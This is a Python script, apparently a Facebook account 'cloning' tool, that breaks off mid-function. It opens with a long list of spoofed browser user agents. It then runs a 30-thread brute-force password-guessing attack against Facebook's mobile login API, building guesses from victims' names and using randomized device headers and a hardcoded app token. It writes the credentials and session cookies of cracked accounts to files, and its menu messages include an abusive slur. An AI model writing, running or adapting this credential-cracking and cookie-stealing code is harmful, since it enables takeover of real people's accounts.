Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7516498667636054492 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v404197172359898842 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v331255244749692720 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v1141479385100107535 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v113469690414676367 t7454547885219621689 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215471138 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v6166280012437190145 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740484474 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v4297591102078986176 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2171903868175093894 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1754169930219420181 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6333720976224824521 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215573168 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1206684614213914794 t1479978021737656703 ath4b3726d5 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4740508464 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v491392697765060729 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8738602164737142063 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v5055390139397942904 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v6176284400327901126 t3428360957270603442 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215641384 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v2899582870370254836 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v7519045008947178443 t4109306862226254733 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2582832712595577758 t1865758485807943117 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4740532275 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4583430091197143955 t108896256523930349 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4980602542149474897 t8093092299234304605 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v1639227970253347342 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6061561874529354873 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9197751172116712472 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v10011283759272695 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215740016 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215745647 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6980889766868544957 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v5052095287112273803 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4767794136023886487 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740555517 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6450520027995672485 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215808244 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v1872267430685357202 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v2845320710860705320 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3718801101819303150 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4188194823470371169 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740579414 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5869734742608989507 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v9084041351379867160 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215910264 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4639199508410487282 t6583828985718256818 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8681987220671355927 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4351397214977316835 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v37003402930565689 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v3525134327834240278 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v5571404649910827233 t7454547885219621689 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215978473 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8356872843420553543 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740603319 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v5043633743419663969 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7994796855276585536 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6030128622839186006 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7875292909063374579 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216080501 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v117949514735453019 t1479978021737656703 ath4b3726d5 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4740627228 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8193078289109210550 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6674022040617389791 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v1930726795496505614 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v825316463071835855 t3428360957270603442 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216148705 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v6177520797700783033 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1167237561826244614 t4109306862226254733 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4740651128 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6548651494991813410 t1865758485807943117 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1635317657169688114 t108896256523930349 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v799284131744665025 t8093092299234304605 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4638746326389231947 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v7009351797327972341 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2373076866650673365 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7605812789465101837 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216247350 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5376638030390363943 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v9141737963419875314 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1377525953552160267 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740674362 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4123109437764068959 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216315572 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4864976290123726892 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v2412102698395490051 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v4907426667461427709 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v235549919684546892 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740698262 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9053897891950126163 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8245272578888746447 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216417561 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v8281575909895522274 t6583828985718256818 athe94ac249 altpriv cvcv=2 smf=0",])+END
	return ua

	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Cloning Process Has Been Completed ')
			p(' [•] Total OK Accounts : %s '%(len(ok)))
			p(' [•] Total CP Accounts : %s '%(len(cp)))
			line()
			input(' [•] Press Enter To Go Back To Main Menu ')
			self.menu()
	def menu(self):
		logo()
		p(' [•] This Script is Free Open-Souce Coded by JANI Ali ID ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Join Dilute Coders Facebook Group ")
		p(' [3] Join Dilute Coders Whatsapp Group ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open https://facebook.com/groups/124939013896146/')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp.com/GzUiQ51HrLpDzebhrmsgYh')
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.menu()
	def methods_menu(self):
		line()
		p(' [1] Method 1 \n [2] Method 2 \n [3] Method 3')
		line()
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		elif m_2 == '2':
			method.append('ii')
			self.cracking()
		elif m_2 == '3':
			method.append('iii')
			self.cracking()
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.methods_menu()

	def cracking(self):
		clear()
		logo()
		try:
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()

	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,last1122,firstlast,last Etc ')
		for n in range(plimit):
			pwx.append(input(' [•] Put Password %s : '%(n+1)))
		clear();logo()
		p(' [•] Dilute Brute Has Been Started ')
		line()
		p(' [•] Total Clone Accounts :  %s '%(len(id)))
		line()
		p(' [•] Use Flight ( Jahaz ) Mode Before / During Cloning ')
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)

	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [JANI] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[JANI-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/JANI_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/JANI_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[JANI-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/JANI_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)

	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [JANI] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
